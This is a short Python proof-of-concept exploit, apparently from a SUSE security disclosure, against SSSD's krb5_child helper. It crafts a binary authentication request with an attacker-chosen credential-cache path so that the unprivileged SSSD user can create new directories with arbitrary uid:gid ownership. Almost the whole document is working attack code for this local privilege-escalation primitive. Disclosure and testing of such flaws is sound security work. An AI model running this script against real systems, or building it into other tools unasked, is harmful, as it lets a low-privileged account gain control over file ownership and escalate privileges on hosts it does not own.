#!/usr/bin/python3

# Author: Matthias Gerstner (SUSE Linux)
# 2024-11-14
#
# This is a proof-of-concept to show that the krb5_child helper program from
# SSSD version 2.0.10 allows to create arbitrary new directories with
# arbitrary membership.
#
# To test this you need to adjust the HELPER path below to the proper location
# and invoke the script as the unprivileged SSSD user like this:
#
# sssd-create-dir-via-krb5.py `id -u`:`id -g` /path/to/new/directory

import argparse
import os
import struct
import subprocess
import sys

HELPER="/usr/libexec/sssd/krb5_child"

parser = argparse.ArgumentParser()
parser.add_argument("ownership", metavar="OWNERSHIP", help="uid:gid ownership to give to file")
parser.add_argument("path", metavar="DIRPATH", help="path to apply new ownership to")

args = parser.parse_args()

try:
    uid, gid = args.ownership.split(':')
    uid = int(uid)
    gid = int(gid)
except Exception:
    print("Failed to parse OWNERSHIP from", args.ownership, "expected format '<uid>:<gid>'", file=sys.stderr)
    sys.exit(1)

if os.path.exists(args.path):
    print(args.path, "already exists. This PoC can only create new directories.")
    sys.exit(1)

proc = subprocess.Popen([HELPER, "--debug-fd=2", "--debug-level=10", "--logger=stderr"], stdin=subprocess.PIPE)

def bin_uint32(i):
    return struct.pack("=I", i)

def bin_str(s):
    return bin_uint32(len(s)) + s.encode()

data = bytes()
data += bin_uint32(0x00F1) # pd->cmd SSS_PAM_AUTHENTICATE
data += bin_uint32(uid) # kr->uid
data += bin_uint32(gid) # kr->gid
data += bin_uint32(0) # kr->validate
data += bin_uint32(0) # kr->posix_domain
data += bin_uint32(0) # offline
data += bin_uint32(0) # send_pac
data += bin_uint32(0) # use_enterprise_princ
data += bin_str("test") # kr->upn
data += bin_str(args.path + "/base") # kr->ccname
data += bin_str("") # kr->old_ccname
data += bin_str("") # kr->keytab
data += bin_uint32(0) # auth_token_type (0 == TYPE_EMPTY)
data += bin_str("") # auth_token

data = bin_uint32(len(data)) + data

proc.stdin.write(data)
proc.stdin.close()

res = proc.wait()
print("helper exited with", res)

if not os.path.isdir(args.path):
    print("The PoC seems to have failed to create the new directory.")
else:
    print("The new directory has been created:")
    subprocess.call(["ls", "-ld", args.path])

